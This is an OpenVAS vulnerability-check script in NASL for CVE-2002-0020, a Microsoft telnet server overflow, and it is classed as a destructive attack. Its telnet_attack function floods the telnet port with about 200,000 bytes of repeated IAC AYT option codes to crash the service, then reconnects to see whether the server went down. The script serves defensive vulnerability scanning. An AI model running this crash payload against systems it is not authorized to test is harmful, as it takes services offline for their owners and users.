###################################################################
# OpenVAS Vulnerability Test
#
# MS Telnet Overflow
#
# LSS-NVT-2009-008
#
# Developed by LSS Security Team <http://security.lss.hr>
#
# Copyright (C) 2009 LSS <http://www.lss.hr>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public
# License along with this program. If not, see
# <http://www.gnu.org/licenses/>.
###################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.102008");
  script_version("2022-05-09T13:48:18+0000");
  script_tag(name:"last_modification", value:"2022-05-09 13:48:18 +0000 (Mon, 09 May 2022)");
  script_tag(name:"creation_date", value:"2009-10-05 19:43:01 +0200 (Mon, 05 Oct 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2002-0020");
  script_name("MS Telnet Overflow");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("Copyright (C) 2009 LSS");
  script_family("Buffer overflow");
  script_dependencies("telnetserver_detect_type_nd_version.nasl");
  script_require_ports("Services/telnet", 23);
  script_mandatory_keys("telnet/banner/available");

  script_xref(name:"URL", value:"https://docs.microsoft.com/en-us/security-updates/securitybulletins/2002/ms02-004");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/4061");

  script_tag(name:"solution", value:"The vendor has released updates. Please see the references for
  more information.");

  script_tag(name:"summary", value:"It is possible to crash remote telnet server via malformed protocol options.
  This flaw may allow attackers to execute arbitrary code on the system.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("telnet_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

##Vulnerability tested on AYT commands##
function telnet_attack( port ) {

  iac_ayt = raw_string( 0xff, 0xf6 );
  bomb_size = 100000;
  sock = open_sock_tcp( port );
  if( sock ) {
    bomb = crap( data:iac_ayt, length:2 * bomb_size );
    send( socket:sock, data:bomb );
    close( sock );
    return TRUE;
  } else {
    return FALSE;
  }
}

port = telnet_get_port( default:23 );

if( telnet_attack( port:port ) ){
  sock = open_sock_tcp( port );
  if( ! sock ) {
    security_message( port:port );
    exit( 0 );
  } else {
    close( sock );
    exit( 99 );
  }
}

exit( 99 );
